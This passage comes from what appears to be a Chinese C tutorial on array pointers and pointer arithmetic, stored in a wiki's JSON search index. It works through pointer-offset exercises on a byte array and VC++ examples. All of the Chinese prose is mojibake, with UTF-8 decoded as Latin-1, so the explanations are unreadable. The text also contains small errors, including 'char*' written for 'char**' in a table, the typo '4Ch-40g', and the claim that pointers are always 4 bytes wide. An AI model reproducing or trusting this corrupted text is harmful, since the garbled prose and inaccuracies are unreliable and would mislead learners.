*pxå¾—åˆ°çš„æ˜¯ä»€ä¹ˆï¼Ÿå°†int(*) [3]ç å»ä¸€ä¸ª*åï¼Œå°±æ˜¯ä¸€ä¸ªä¸€ç»´æ•°ç»„ï¼Œå®½åº¦ä¸º3ã€‚(*px)[0]ï¼Œå°±æ˜¯å–è¿™ä¸ªæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªæˆå‘˜ï¼Œå–å‡ºæ¥çš„æ˜¯1ã€‚ 12345678//æ‰“å°ä¼šè¾“å‡º 1 3printf(&quot;%d %d &quot;, (*px)[0], (*px)[2]);px++; //++ï¼Œå°†(int* [3])ç å»ä¸€ä¸ª*ï¼Œå‰©ä¸‹int [3]ï¼Œå®½åº¦æ˜¯12 //äºæ˜¯++å,è·³è¿‡äº†12å­—èŠ‚ï¼ŒæŒ‡å‘äº†ä¸‹ä¸€è¡Œæ•°ç»„&#123;4, 5, 6&#125;//æ‰“å°ä¼šè¾“å‡º 4 6printf(&quot;%d %d &quot;, (*px)[0], (*px)[2]); æ›´å¤šä¾‹å­ 12345678910111213char code[] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x07, 0x09, 0x00, 0x20, 0x10, 0x03, 0x03, 0x0C, 0x00, 0x00, 0x44, 0x00, 0x00, 0x33, 0x00, 0x47, 0x0C, 0x0E, 0x00, 0x0D, 0x00, 0x11, 0x00, 0x00, 0x00, 0x02, 0x64, 0x00, 0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x64, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x74, 0x0F, 0x41, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x02, 0x74, 0x0F, 0x41, 0x00, 0x06, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x0F, 0x00, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x64, 0x00, 0x00, 0x64, 0x00&#125;; ä¸€ç»´æ•°ç»„æŒ‡é’ˆäºŒç»´æ•°ç»„æŒ‡é’ˆä¸‰ç»´æ•°ç»„æŒ‡é’ˆcharå‹intå‹1234char(*p)[5];p = (char(*)[5])code;printf(&quot;%x &quot;, *(*(p + 4) + 3)); //å–å‡ºæ¥çš„å€¼æ˜¯å¤šå°‘ï¼Ÿ æ•°å­— è¡¨è¾¾å¼ å…·ä½“æ•°å­— 4 4Ã—char[5] 4Ã—5=20 3 3Ã—sizeof(char) 3Ã—1=3 æ€»å’Œ23 å–charä¸ªå­—èŠ‚ 1234567char code[] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x07, 0x09, //0-9 0x00, 0x20, 0x10, 0x03, 0x03, 0x0C, 0x00, 0x00, 0x44, 0x00, //10-19 0x00, 0x33, 0x00, 0x47, 0x0C, 0x0E, 0x00, 0x0D, 0x00, 0x11, //20-29ï¼Œ23å°±æ˜¯0x47 //...&#125;; *(*(px + 0) + 0)å°±æ˜¯æ•°ç»„ç¬¬ä¸€ä¸ª0x00ï¼Œç¬¬1ä¸ªå°±æ˜¯æ•°ç»„ä¸‹æ ‡ä¸º1ï¼Œè·³è¿‡23å­—èŠ‚ï¼Œå°±æ˜¯ä¸‹æ ‡ä¸º23ã€‚ æœ€ç»ˆç»“æœï¼š0x471234int(*p)[5];p = (int(*)[5])code;printf(&quot;%x &quot;, *(*(p + 2) + 2)); // å–å‡ºæ¥çš„å€¼æ˜¯å¤šå°‘ï¼Ÿ æ•°å­— è¡¨è¾¾å¼ å…·ä½“æ•°å­— 2 2Ã—int[5] 2Ã—20=40 2 2Ã—sizeof(int) 2Ã—4=8 æ€»å’Œ48 ä¸Šé¢æ¯ä¸ªæ•°å­—éƒ½è¦Ã—sizeof(int)ï¼Œå…ˆåŠ ä¸€èµ·æœ€åÃ—4ä¹Ÿè¡Œã€‚å³ï¼š 2Ã—5+2 ï¼ˆ2Ã—5+2ï¼‰Ã—4=48 12345678910111213char code[] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x07, 0x09, 0x00, 0x20, 0x10, 0x03, 0x03, 0x0C, 0x00, 0x00, 0x44, 0x00, 0x00, 0x33, 0x00, 0x47, 0x0C, 0x0E, 0x00, 0x0D, 0x00, 0x11, 0x00, 0x00, 0x00, 0x02, 0x64, 0x00, 0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x64, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 40-49 0x00, 0x00, 0x02, 0x00, 0x74, 0x0F, 0x41, 0x00, 0x00, 0x00, // 50-59 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x02, 0x74, 0x0F, 0x41, 0x00, 0x06, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x0F, 0x00, 0x00, 0x0D, 0x00, 0x00, 0x00, 0x23, 0x00, 0x00, 0x64, 0x00, 0x00, 0x64, 0x00 &#125;; å–intä¸ªå­—èŠ‚ï¼Œå°±æ˜¯å–äº†char[48]ï¼Œchar[49]ï¼Œchar[50]ï¼Œchar[51]ï¼Œ0x00,0x00,0x00,0x00ã€‚å› ä¸ºå°ç«¯åºï¼Œæ‰€ä»¥æœ€ç»ˆç»“æœï¼š0x00000000charå‹intå‹1234char(*p)[2][3];p = (char(*)[2][3])code;printf(&quot;%x &quot;, *(*(*(p + 2) + 3) + 4)); // å–å‡ºæ¥çš„å€¼æ˜¯å¤šå°‘ï¼Ÿ ä»ä¸€ç»´æ•°ç»„æŒ‡é’ˆå–å€¼è¦ä¸¤ä¸ª*å·ï¼Œé‚£ä¹ˆä»äºŒç»´æ•°ç»„æŒ‡é’ˆä¸­å–å€¼è¦å†å¤šä¸€ä¸ª*å· æ•°å­— è¡¨è¾¾å¼ å…·ä½“æ•°å­— 2 2Ã—char[2][3] 2Ã—6=12 3 3Ã—char[3] 3Ã—3=9 4 4Ã—sizeof(char) 4Ã—1=4 æ€»å’Œ25 å–charä¸ªå­—èŠ‚ 1234567char code[] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x07, 0x09, 0x00, 0x20, 0x10, 0x03, 0x03, 0x0C, 0x00, 0x00, 0x44, 0x00, // 10-19 0x00, 0x33, 0x00, 0x47, 0x0C, 0x0E, 0x00, 0x0D, 0x00, 0x11, // 20-29 //... &#125;; æœ€ç»ˆç»“æœï¼š0x0E1234int(*p)[2][3];p = (int(*)[2][3])code;printf(&quot;%x &quot;, *(*(*(p + 2) + 2) + 2)); // å–å‡ºæ¥çš„å€¼æ˜¯å¤šå°‘ï¼Ÿ æ•°å­— è¡¨è¾¾å¼ å…·ä½“æ•°å­— 2 2Ã—int[2][3] 2Ã—24=48 2 2Ã—int[3] 2Ã—12=24 2 2Ã—sizeof(int) 2Ã—4=8 æ€»å’Œ80 å–intä¸ªå­—èŠ‚ï¼Œå°±æ˜¯å–char[80]-char[83]å…±å››ä¸ªå­—èŠ‚çš„æ•°ï¼Œ0x00,0x00,0x00,0x64 12345678910111213char code[] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x07, 0x09, 0x00, 0x20, 0x10, 0x03, 0x03, 0x0C, 0x00, 0x00, 0x44, 0x00, 0x00, 0x33, 0x00, 0x47, 0x0C, 0x0E, 0x00, 0x0D, 0x00, 0x11, 0x00, 0x00, 0x00, 0x02, 0x64, 0x00, 0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x64, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x74, 0x0F, 0x41, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x0A, 0x00, 0x00, 0x02, 0x74, 0x0F, 0x41, 0x00, 0x06, 0x08, 0x00, 0x00, //70-79 0x00, 0x00, 0x00, 0x64, 0x00, 0x0F, 0x00, 0x00, 0x0D, 0x00, //80-89 0x00, 0x00, 0x23, 0x00, 0x00, 0x64, 0x00, 0x00, 0x64, 0x00&#125;; æ³¨æ„å°ç«¯åºã€‚æœ€ç»ˆç»“æœï¼š64000000charå‹intå‹1234char(*p)[2][3][2];p = (char(*)[2][3][2])code;printf(&quot;%x &quot;, *(*(*(*(p + 2) + 2) + 2) + 2)); // å–å‡ºæ¥çš„å€¼æ˜¯å¤šå°‘ï¼Ÿ æ•°å­— è¡¨è¾¾å¼ å…·ä½“æ•°å­— 2 2Ã—char[2][3][2] 2Ã—12=24 2 2Ã—char[3][2] 2Ã—6=12 2 2Ã—char[2] 2Ã—2=4 2 2Ã—sizeof(char) 2Ã—1=2 æ€»å’Œ42 å–charä¸ªå­—èŠ‚ 123456789char code[] = &#123; 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x07, 0x09, 0x00, 0x20, 0x10, 0x03, 0x03, 0x0C, 0x00, 0x00, 0x44, 0x00, 0x00, 0x33, 0x00, 0x47, 0x0C, 0x0E, 0x00, 0x0D, 0x00, 0x11, 0x00, 0x00, 0x00, 0x02, 0x64, 0x00, 0x00, 0x00, 0xAA, 0x00, 0x00, 0x00, 0x64, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // 40-49 //... &#125;; æœ€ç»ˆç»“æœï¼š0x64ç•¥ äºŒç»´æ•°ç»„æŒ‡é’ˆå¯ä»¥è®¿é—®ä¸€ç»´æ•°ç»„å—ï¼Ÿ 1234567int arr[] = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 0&#125;;//æƒ³æŠŠarrèµ‹ç»™pxï¼Œç±»å‹è¦ä¸€æ ·//int(*px)[2][2] = arr; //ç¼–è¯‘æŠ¥é”™//è¦å¼ºè½¬ä¸ºint(*)[2][2]ç±»å‹int(*px)[2][2] =(int(*)[2][2])arr; //ok pxç°åœ¨æ˜¯arræ•°ç»„çš„é¦–åœ°å€ã€‚é‚£*pxæ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Ÿ*pxå–å‡ºæ¥çš„ä¸œè¥¿å°±æ˜¯åŸæ¥çš„ç±»å‹ç å»ä¸€ä¸ª*ï¼Œ(int(*)[2][2])ç±»å‹å»æ‰ä¸€ä¸ª*åæ˜¯(int[2][2])ï¼Œä¸€ä¸ªäºŒç»´æ•°ç»„ã€‚é‚£ä¹ˆï¼Œåœ¨æˆ‘ä»¬çœ¼ä¸­ï¼Œ*pxå°±æ˜¯int[2][2]çš„æ•°ç»„ã€‚ 12345678910//1ç»„ä¸¤ä¸ªï¼Œç¬¬0ä¸ªï¼Œç¬¬1ä¸ª//ç¬¬0ç»„ï¼š1, 2//ç¬¬1ç»„ï¼š3, 4//ç¬¬2ç»„ï¼š5, 6//ç¬¬3ç»„ï¼š7, 8//ç¬¬4ç»„ï¼š9, 10(*px)[1][1]; //å–ç¬¬1ç»„çš„ç¬¬1ä¸ªï¼Œå–å‡ºæ¥æ˜¯4//å¦ä¸€ç§æƒ³æ³•//int[2][2]ä¹Ÿå°±æ˜¯ç­‰äºint[4]ï¼Œæ‰€ä»¥&#123;1,2,3,4&#125;ç»™äº†int[2][2]ï¼Œä¹Ÿå°±æ˜¯&#123;&#123;1,2&#125;, &#123;3,4&#125;&#125; 123px++; //++ï¼ŒåŠ sizeof(int)Ã—2Ã—2=16 //++åï¼ŒæŒ‡å‘&#123;&#123;5,6&#125;,&#123;7,8&#125;&#125;printf(&quot;%d &quot;, (*px)[1][1]); //å†å–å°±æ˜¯8 ç»ƒä¹  *()ä¸[]æ˜¯å¯ä»¥äº’æ¢çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œ*(*(p+1)+2)ç›¸å½“äºp[1][2]ï¼Œé‚£ä¹ˆï¼Œ*(p+1)[2]æ˜¯å¦ä¸€å®šç­‰äºp[1][2]ï¼Ÿé€šè¿‡åæ±‡ç¼–è¿›è¡Œè®ºè¯ã€‚ ç­”æ¡ˆåæ±‡ç¼–çœ‹ä¸€ä¸‹å’¯123456789101112131415#include &quot;stdafx.h&quot;int main()&#123; int arr[] = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 10&#125;; int(*p)[2] = (int(*)[2])arr; printf(&quot;%d &quot;, p[1][2]); printf(&quot;%d &quot;, *(*(p + 1) + 2)); printf(&quot;%d &quot;, *(p + 1)[2]); return 0;&#125;åæ±‡ç¼–ä¸­çœ‹åˆ°ä¸€æ­¥åˆ°ä½å°±å–æ•°äº†ï¼Œé‚£æˆ‘ä»¬æ‹¿è¿è¡Œåçš„ç»“æœå’Œç°æœ‰ç†è®ºçœ‹æ˜¯å¦åŒ¹é…ã€‚12p[1][2]*(*(p + 1) + 2)ç¬¬ä¸€ä¸ªæ•°ï¼Œè·³è¿‡1ä¸ªint[2]ï¼ŒæŒ‡å‘3ï¼›ç¬¬äºŒä¸ªæ•°ï¼Œè·³è¿‡2ä¸ªintï¼ŒæŒ‡å‘5ã€‚å—¯ï¼Œåˆç†ã€‚ä½†*(p + 1)[2]æ€ä¹ˆè¾“å‡ºæ˜¯7ï¼Ÿéš¾é“ä¸èƒ½éšæ„ç”¨*(p+i) = p[i]æ›¿æ¢ï¼Ÿå†çœ‹å¦‚ä¸‹ä¸¤ä¸ªè¡¨è¾¾å¼ï¼Œæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ12printf(&quot;%d &quot;, *(p + 1)[2]); printf(&quot;%d &quot;, (*(p + 1))[2]); çœ‹å‡ºæ¥äº†å—ï¼Ÿè¿™å…¶å®ä¸æ˜¯ç­‰ä»·å˜åŒ–çš„é—®é¢˜ï¼Œè€Œæ˜¯ä¼˜å…ˆçº§çš„é—®é¢˜ã€‚*(p + 1)[2]ï¼Œ()å°æ‹¬å·ä¼˜å…ˆçº§æœ€é«˜ï¼Œå…ˆp+1ï¼Œåç§»1ä¸ªint[2]ï¼ŒæŒ‡å‘äº†3ã€‚ç”¨ç¬¦å·pxä½œä¸ºp+1çš„ç»“æœï¼Œç°åœ¨å˜æˆ*px[2]ï¼Œ[]ä¼˜å…ˆçº§æ¯”*å·é«˜ï¼Œpxå¾€åèµ°2ä¸ªint[2]ï¼Œæ¥åˆ°äº†7ã€‚ç”¨ç¬¦å·pyä½œä¸ºpx[2]çš„ç»“æœï¼Œç°åœ¨å˜æˆ*pyï¼Œå–å€¼ï¼Œå–å‡ºæ¥æ˜¯7ã€‚(*(p + 1))[2]ï¼Œå¤šäº†ä¸€ä¸ªæ‹¬å·ï¼Œä¿è¯p+1ç®—å®Œåï¼Œå…ˆä¸*ç»“åˆã€‚ç”¨pxä½œä¸º*(p+1)ï¼Œpx[2]ï¼Œp+1ç®—å®ŒæŒ‡å‘3ï¼ŒåŠ *ï¼Œç°åœ¨æ˜¯æ•°ç»„ç±»å‹ï¼Œå–æ•°ç»„ä¸­ç¬¬2ä¸ªå…ƒç´ ï¼Œæ‰€ä»¥å¾€åèµ°2ä¸ªintï¼Œå–å‡ºæ¥5ã€‚ ä¸å°†è¡¨è¾¾å¼åšå˜åŒ–ï¼Œä¸‹é¢è¿™ä¸ªè¡¨è¾¾å¼å–å‡ºæ¥æ˜¯å¤šå°‘ï¼Œæ€ä¹ˆç®—çš„ 1234567891011#include &quot;stdafx.h&quot;int main()&#123; int arr[] = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 0&#125;; int(*px)[2] = (int(*)[2])arr; printf(&quot;%d &quot;, *(*(px + 1) + 1)); return 0;&#125; ç­”æ¡ˆpx+1ï¼ŒæŒ‡é’ˆç±»å‹åšè¿ç®—ï¼Œçœ‹å»æ‰ä¸€ä¸ª*åçš„ç±»å‹çš„å®½åº¦ï¼›pxæ˜¯int(*)[2]ç±»å‹ï¼Œå»æ‰ä¸€ä¸ª*åæ˜¯int [2]ç±»å‹ï¼Œå®½åº¦æ˜¯sizeof(int)Ã—2=8ï¼Œå¢åŠ 8ã€‚äºæ˜¯ä»arræ•°ç»„å¼€å§‹å¾€åç§»8ä¸ªå­—èŠ‚ï¼Œç°åœ¨æŒ‡å‘3;*(px + 1)ï¼Œ*(px + 1)æ˜¯æ•°ç»„ç±»å‹ï¼Œint [2];*(px + 1)+1ï¼Œæ•°ç»„ç±»å‹ï¼Œ+1ï¼Œå°±æ˜¯åœ¨æ•°ç»„ä¸­ç§»åŠ¨å…ƒç´ ä¸ªæ•°ï¼Œ+1ï¼Œç§»åŠ¨1ä¸ªintã€‚äºæ˜¯å¾€åç§»1ä¸ªå…ƒç´ ï¼ŒæŒ‡å‘4;ï¼ˆä¹Ÿå¯ä»¥æŠŠæ•°ç»„å½“æˆæŒ‡é’ˆï¼Œç„¶åå¥—æŒ‡é’ˆç±»å‹åšè¿ç®—ç *çš„æ–¹æ³•ï¼‰*(*(px + 1) + 1)ï¼ŒåŠ *å·ï¼Œå–å‡ºè¿™ä¸ªå…ƒç´ ã€‚ç»¼ä¸Šï¼Œç¬¬ä¸€ä¸ªæ•°å­—1ï¼Œè·³è¿‡1Ã—int [2]ï¼Œç¬¬äºŒä¸ªæ•°å­—1ï¼Œåœ¨æ•°ç»„ä¸­å¾€åæŸ¥1ä¸ªä¸ªæ•°ï¼ˆä¹Ÿå¯ä»¥è¯´æ˜¯ç§»åŠ¨1ä¸ªintï¼‰ã€‚ ä»¥ä¸‹è¯´æ³•æ˜¯å¦æ­£ç¡®ï¼š 1234æŒ‡é’ˆçš„æŒ‡é’ˆï¼šå°±æ˜¯æŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆç»“æ„æŒ‡é’ˆï¼šå°±æ˜¯æŒ‡å‘ç»“æ„çš„æŒ‡é’ˆæ•°ç»„æŒ‡é’ˆï¼šå°±æ˜¯æŒ‡å‘æ•°ç»„çš„æŒ‡é’ˆå‡½æ•°æŒ‡é’ˆï¼šå°±æ˜¯æŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆ ç­”æ¡ˆæŒ‡é’ˆçš„ç±»å‹ä¸å®ƒæŒ‡å‘çš„æ•°æ®çš„ç±»å‹æ— å…³ã€‚ä»¥ç»“æ„ä½“æŒ‡é’ˆä¸ºä¾‹ï¼Œç»“æ„ä½“æŒ‡é’ˆä¸ä¸€å®šè¦æŒ‡å‘ç»“æ„ä½“ï¼Œçˆ±æŒ‡å“ªæŒ‡å“ªã€‚"},{"title":"æŒ‡é’ˆç‰¹å¾æ¢æµ‹","path":"/wiki/C/æŒ‡é’ˆç‰¹å¾æ¢æµ‹.html","content":"å¼• å¦‚æœä½ ä¹‹å‰å­¦è¿‡æŒ‡é’ˆï¼Œå½“æˆ‘ä¸€æèµ·æŒ‡é’ˆæ—¶å¯èƒ½ä½ é©¬ä¸Šä¼šæƒ³åˆ°åœ°å€ã€‚è¯·å¿˜æ‰è¿™ä¸€ç‚¹ï¼Œåœ¨è¿™ä¸€å°èŠ‚è¯¾ä¸­ï¼Œæˆ‘ä»¬åªéœ€è¦çŸ¥é“æŒ‡é’ˆæ˜¯ä¸€ç§æ–°çš„æ•°æ®ç±»å‹ï¼Œå°±å¥½äº†ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬å°†å¯¹è¿™ä¸ªæ–°çš„æ•°æ®ç±»å‹çš„ç‰¹å¾è¿›è¡Œä¸€ä¸€æ¢æµ‹ã€‚ å®šä¹‰ æŒ‡é’ˆå°±æ˜¯ä¸€ç§æ–°çš„ç±»å‹ï¼Œä¸charã€intã€æ•°ç»„ã€ç»“æ„ä½“ä¸€æ ·ï¼Œéƒ½æ˜¯ç±»å‹ã€‚ ç»™ä»»ä½•æ•°æ®ç±»å‹åŠ ä¸Š*ä»¥åï¼Œå°±æ˜¯â€œæŒ‡é’ˆç±»å‹â€ã€‚ *å¯ä»¥æ˜¯ä»»æ„å¤šä¸ªã€‚ å†…ç½®ç±»å‹/è‡ªå®šä¹‰ç±»å‹çš„å£°æ˜1234567char x;short y;int z;float f;double d;Student st; æŒ‡é’ˆç±»å‹çš„å£°æ˜1234567char* x;short* y;int* z;float* f;double* d;Student* st; ä¸ºäº†å¯è¯»æ€§ï¼Œå»ºè®®å†™æˆchar* xè€Œä¸æ˜¯char *x èµ‹å€¼ æˆ‘ä»¬å¹³æ—¶ç»™å˜é‡èµ‹å€¼æ—¶å…¶å®å†™çš„æ˜¯ç®€å†™å½¢å¼ï¼Œç¼–è¯‘å™¨æ˜¯æ™ºèƒ½çš„ï¼Œå®ƒèƒ½çœ‹æ˜ç™½ã€‚è€Œå®Œæ•´çš„å†™æ³•å¦‚ä¸‹ï¼š 1234int x;x = 1; // ç®€å†™å½¢å¼x = (int)1; // å®Œæ•´å†™æ³• åŒç†ï¼Œç»™æŒ‡é’ˆå˜é‡èµ‹å€¼çš„å®Œæ•´å†™æ³•å¦‚ä¸‹: å¸¦*ç±»å‹çš„å˜é‡èµ‹å€¼æ—¶åªèƒ½ç”¨å®Œæ•´å†™æ³•ã€‚ å…¶å®æ˜¯å¼ºè½¬äº†ï¼Œå¦‚æœæ˜¯å¦‚ä¸‹ä»£ç ï¼Œç±»å‹ä¸åŒ¹é… 123int* z;z = 3; å®½åº¦ è°ˆèµ·æ•°æ®ç±»å‹ï¼Œæˆ‘ä»¬è¦å…³æ³¨å®ƒçš„å®½åº¦ã€‚ æŒ‡é’ˆç±»å‹å˜é‡çš„å®½åº¦æ°¸è¿œæ˜¯4å­—èŠ‚ï¼Œæ— è®ºæ˜¯ä»€ä¹ˆç±»å‹çš„æŒ‡é’ˆï¼Œæ— è®º*å·æœ‰å‡ ä¸ªã€‚ ä¸€çº§æŒ‡é’ˆå¤šçº§æŒ‡é’ˆ1234567891011121314#include &quot;stdafx.h&quot;int main()&#123; char* x; short* y; int* z; x = (char*)1; y = (short*)2; z = (int*)3; return 0;&#125; VC++ç¼–è¯‘å™¨é»˜è®¤ç»™å‡½æ•°é»˜è®¤ç¼“å†²åŒºä¸º40hï¼Œä¸Šé¢ä»£ç å£°æ˜äº†3ä¸ªæŒ‡é’ˆç±»å‹ã€‚å¤šäº†Chçš„ç©ºé—´ï¼ˆ4Ch-40g=Chï¼‰ã€‚ åˆ†ç©ºé—´çœ‹ä¸å‡ºå®½åº¦ï¼Œè¦çœ‹ä½¿ç”¨æ—¶æ˜¯byteã€wordè¿˜æ˜¯dwordã€‚å¯ä»¥çœ‹åˆ°ï¼Œèµ‹å€¼æ—¶æ˜¯dwordã€‚ æ‰€ä»¥æŒ‡é’ˆç±»å‹å®½åº¦ä¸º4ä¸ªå­—èŠ‚ 1234567891011121314#include &quot;stdafx.h&quot;int main()&#123; char****** x; short****** y; int****** z; x = (char******)1; y = (short******)2; z = (int******)3; return 0;&#125; è‡ªåŠ /è‡ªå‡ è¿™é‡Œä»¥è‡ªåŠ ä¸ºä¾‹ï¼Œè‡ªå‡ä¸€æ ·çš„ åŸºæœ¬æ•°æ®ç±»å‹è‡ªåŠ ä¸€çº§æŒ‡é’ˆè‡ªåŠ äºŒçº§æŒ‡é’ˆè‡ªåŠ 1234567891011121314151617181920#include &quot;stdafx.h&quot;int main()&#123; char a; short b; int c; a = 100; b = 100; c = 100; a++; b++; c++; printf(&quot;%d %d %d&quot;, a, b, c); return 0;&#125; 1234567891011121314151617181920#include &quot;stdafx.h&quot;int main()&#123; char* a; short* b; int* c; a = (char*)100; b = (short*)100; c = (int*)100; a++; b++; c++; printf(&quot;%d %d %d&quot;, a, b, c); return 0;&#125; è¿™é‡Œç”¨çš„æ˜¯äºŒçº§æŒ‡é’ˆçš„ä¾‹å­ï¼Œå¦‚æœæ˜¯å¤šçº§æŒ‡é’ˆä¹Ÿä¸€æ ·ã€‚ 1234567891011121314151617181920#include &quot;stdafx.h&quot;int main()&#123; char** a; short** b; int** c; a = (char**)100; b = (short**)100; c = (int**)100; a++; b++; c++; printf(&quot;%d %d %d&quot;, a, b, c); return 0;&#125; å°ç»“ ä¸å¸¦*ç±»å‹çš„å˜é‡ï¼Œ++æˆ–è€…â€“ï¼Œå°±æ˜¯åŠ 1æˆ–è€…å‡1 å¸¦*ç±»å‹çš„å˜é‡ï¼Œå¯è¿›è¡Œ++æˆ–è€…â€“çš„æ“ä½œ å¸¦*ç±»å‹çš„å˜é‡++æˆ–è€…â€“æ–°å¢(å‡å°‘)çš„æ•°é‡æ˜¯å»æ‰ä¸€ä¸ª*åå˜é‡çš„å®½åº¦ ä¸å¸¦*ç±»å‹çš„å˜é‡ ++ â€“ char 1 1 short 1 1 int 1 1 å¸¦1ä¸ª*ç±»å‹çš„å˜é‡ ++ â€“ char* 1 1 short* 2 2 int* 4 4 å¸¦å¤šä¸ª*ç±»å‹çš„å˜é‡ ++ â€“ char* 4 4 short** 4 4 int** 4 4 åŠ å‡æ³•è¿ç®— è¿™é‡Œä»¥åŠ æ³•ä¸ºä¾‹ï¼Œå‡æ³•ä¸€æ ·çš„ ä¸€çº§æŒ‡é’ˆåšåŠ æ³•äºŒçº§æŒ‡é’ˆåšåŠ æ³•1234567891011121314151617181920#include &quot;stdafx.h&quot;int main()&#123;\tchar* a ; short* b ; int* c ; a = (char*)100; b = (short*)100; c = (int*)100; a = a + 5; b = b + 5; c = c + 5; printf(&quot;%d %d %d&quot;,a,b,c); return 0;&#125; ç¼–è¯‘å™¨çœ‹åˆ°a+5ï¼Œå°†açš„ç±»å‹char*å»æ‰1ä¸ª*ï¼Œæ˜¯charï¼Œå®ƒçš„å®½åº¦æ˜¯1ï¼Œæ‰€ä»¥+5*1 ç¼–è¯‘å™¨çœ‹åˆ°b+5ï¼Œå°†bçš„ç±»å‹short*å»æ‰1ä¸ª*ï¼Œæ˜¯shortï¼Œå®ƒçš„å®½åº¦æ˜¯2ï¼Œæ‰€ä»¥+5*2 ç¼–è¯‘å™¨çœ‹åˆ°c+5ï¼Œå°†cçš„ç±»å‹int*å»æ‰1ä¸ª*ï¼Œæ˜¯intï¼Œå®ƒçš„å®½åº¦æ˜¯4ï¼Œæ‰€ä»¥+5*4 1234567891011121314151617181920#include &quot;stdafx.h&quot;int main()&#123;\tchar** a ; short** b ; int** c ; a = (char**)100; b = (short**)100; c = (int**)100; a = a + 5; b = b + 5; c = c + 5; printf(&quot;%d %d %d&quot;,a,b,c); return 0;&#125; ç¼–è¯‘å™¨çœ‹åˆ°a+5ï¼Œå°†açš„ç±»å‹char**å»æ‰1ä¸ª*ï¼Œæ˜¯char*ï¼Œå®ƒçš„å®½åº¦æ˜¯4ï¼Œæ‰€ä»¥+5*4 ç¼–è¯‘å™¨çœ‹åˆ°b+5ï¼Œå°†bçš„ç±»å‹short**å»æ‰1ä¸ª*ï¼Œæ˜¯short*ï¼Œå®ƒçš„å®½åº¦æ˜¯4ï¼Œæ‰€ä»¥+5*4 ç¼–è¯‘å™¨çœ‹åˆ°c+5ï¼Œå°†cçš„ç±»å‹int**å»æ‰1ä¸ª*ï¼Œæ˜¯int*ï¼Œå®ƒçš„å®½åº¦æ˜¯4ï¼Œæ‰€ä»¥+5*4 +5ï¼Œå¯ä»¥çœ‹æˆ5æ¬¡++è¿ç®— å°ç»“ å¸¦*ç±»å‹çš„å˜é‡å¯ä»¥åŠ ã€å‡ä¸€ä¸ªæ•´æ•°ï¼Œä½†ä¸èƒ½ä¹˜æˆ–è€…é™¤ä¸€ä¸ªæ•°ï¼ˆä¼šç¼–è¯‘ä¸é€šè¿‡ï¼‰ å¸¦*ç±»å‹å˜é‡ä¸å…¶ä»–æ•´æ•°ç›¸åŠ æˆ–è€…ç›¸å‡æ—¶ï¼š å¸¦*ç±»å‹å˜é‡ + N = å¸¦*ç±»å‹å˜é‡ + N*(å»æ‰ä¸€ä¸ª*åç±»å‹çš„å®½åº¦) å¸¦*ç±»å‹å˜é‡ - N = å¸¦*ç±»å‹å˜é‡ - N*(å»æ‰ä¸€ä¸ª*åç±»å‹çš„å®½åº¦) æ±‚å·®å€¼ æŒ‡é’ˆç±»å‹å¯ä»¥åšå·®å€¼è¿ç®—ï¼Œä¹˜é™¤è™½ç„¶å¯ä»¥ï¼Œä½†æ˜¯è¿ç®—çš„ç»“æœæ²¡æ„ä¹‰ã€‚ ä¸¤ä¸ªæŒ‡é’ˆç±»å‹å˜é‡åšå·®å€¼è¿ç®—ï¼Œå®ƒä»¬*çš„æ•°é‡è¦ä¸€æ ·æ‰èƒ½ç›¸å‡ï¼Œè¦ä¸ç¼–è¯‘ä¸é€šè¿‡ã€‚ ä¸€çº§æŒ‡é’ˆchar*ç›¸å‡ä¸€çº§æŒ‡é’ˆshort*ç›¸å‡ä¸€çº§æŒ‡é’ˆint*ç›¸å‡å¤šçº§æŒ‡é’ˆç›¸å‡ç»“æ„ä½“æŒ‡é’ˆç›¸å‡12345678910111213141516#include &quot;stdafx.h&quot;int main()&#123;\tchar* a ; char* b ; a = (char*)200; b = (char*)100; int x = a - b; printf(&quot;%d &quot;,x); return 0;&#125; å°†açš„ç±»å‹char*å»æ‰1ä¸ª*ï¼Œæ˜¯charï¼Œå®ƒçš„å®½åº¦æ˜¯1 å°†bçš„ç±»å‹char*å»æ‰1ä¸ª*ï¼Œæ˜¯charï¼Œå®ƒçš„å®½åº¦æ˜¯1 (200-100)/1=100 12345678910111213141516#include &quot;stdafx.h&quot;int main()&#123;\tshort* a ; short* b ; a = (short*)200; b = (short*)100; int x = a - b; //æ³¨æ„ï¼šä¸¤ä¸ªæŒ‡é’ˆç±»å‹ç›¸å‡åæ˜¯æ•´å‹intç±»å‹ã€‚å¦‚æœæœ‰å°æ•°ï¼Œä¼šèˆå»ã€‚æ¯”å¦‚(20-10)/4=2 